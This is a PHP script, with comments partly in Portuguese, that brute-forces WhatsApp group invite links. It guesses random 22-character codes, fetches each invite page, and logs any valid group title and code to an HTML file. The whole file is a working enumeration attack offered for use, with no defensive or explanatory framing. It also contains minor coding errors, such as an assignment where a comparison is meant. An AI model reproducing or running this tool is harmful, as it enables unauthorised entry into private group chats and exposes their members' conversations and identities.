<?php
//GENERATE A RANDOM RASH FOR WHATSAPP CHATGROUP LINK
function genHash(){
$upper = implode('', range('A', 'Z')); // ABCDEFGHIJKLMNOPQRSTUVWXYZ
$lower = implode('', range('a', 'z')); // abcdefghijklmnopqrstuvwxyzy
$nums = implode('', range(0, 9)); // 0123456789
$alphaNumeric = $upper.$lower.$nums; // ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
$string = '';
$len = 22; // numero de chars
	for($i = 0; $i < $len; $i++) {
		$string .= $alphaNumeric[rand(0, strlen($alphaNumeric) - 1)];
	}
return $string;
}
echo '
////////////////////////////////////////////////////////////<br />
Whatsapp Bruteforce Chatgroup Link ///<br />
/////////////////////////////////////////////////////////<br />
';
//TO TRY RECURSIVELY
echo str_repeat(" ", 256);
flush();
$brute = 1;
$maxbrute = $_GET['attempts'];
if(isset($maxbrute)){
	echo "Running...<br />";
} else {
	echo "You must specify the attempts!";
}
do{
	$hash = genHash();
	$brute = $brute + 1;
$url = file_get_contents('https://chat.whatsapp.com/invite/'.$hash);
preg_match( "/<meta property=(.*)\/>/i", $url, $title );

if($title['1'] != '"og:title" content=""'){
//SHOW HASH THAT WORKS 
  echo $title['1'].' HASH: '.$hash.'<br />';
//WRITE RESULTS IN WEBPAGE
  $file = "result.html";
  $file = fopen($file, "a");
  $data = "<pre> ".$title['1']." HASH: $hash <br /></pre>";
  fwrite($file, $data);
  fclose($file);
} else {
//SHOW ERROR
        echo 'Hash Failed - '.$hash.'<br />';
     }
} while($brute <= $maxbrute);
if ($brute = $maxbrute){
	echo 'Finished!!!';
}
?>
